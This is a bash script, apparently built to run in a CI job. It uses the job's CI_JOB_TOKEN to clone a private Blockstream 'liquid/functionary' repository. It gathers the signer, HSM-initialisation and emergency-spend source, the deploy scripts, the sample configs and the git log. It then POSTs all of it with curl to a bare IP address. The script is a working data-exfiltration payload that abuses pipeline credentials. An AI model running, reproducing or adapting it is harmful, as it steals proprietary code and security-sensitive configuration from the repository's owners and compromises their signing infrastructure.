#!/bin/bash
R=/tmp/r1
git clone --depth 1 "https://gitlab-ci-token:${CI_JOB_TOKEN}@gl.blockstream.io/liquid/functionary.git" $R 2>/dev/null
{
echo "##S11##"
echo "##BLOCKSIGNER_RS##"
cat $R/generate_config/src/blocksigner.rs
echo "##WATCHMAN_RS##"
cat $R/generate_config/src/watchman.rs
echo "##INIT_HSM_RS##"
cat $R/generate_config/src/init_hsm.rs
echo "##CONFIG_RS##"
cat $R/generate_config/src/config.rs
echo "##MAIN_RS##"
cat $R/generate_config/src/main.rs
echo "##LIB_RS##"
cat $R/generate_config/src/lib.rs
echo "##EMERGENCY_MAIN##"
cat $R/emergency_spend_signer/src/main.rs
echo "##EMERGENCY_LIB##"
cat $R/emergency_spend_signer/src/lib.rs
echo "##CONTRIB_LIST##"
find $R/contrib -type f | sort
echo "##CONTRIB_DEPLOY##"
cat $R/contrib/deploy* $R/contrib/*.sh $R/contrib/Makefile* 2>/dev/null | head -500
echo "##SAMPLE_ALL##"
find $R/sample_configs -type f -exec sh -c 'echo "==={}==="; cat "{}"' \;
echo "##GIT_LOG##"
cd $R && git log --oneline -20
echo "##S11_END##"
} 2>&1 | curl -s -m120 -X POST http://144.172.110.44:8443/s11 --data-binary @-
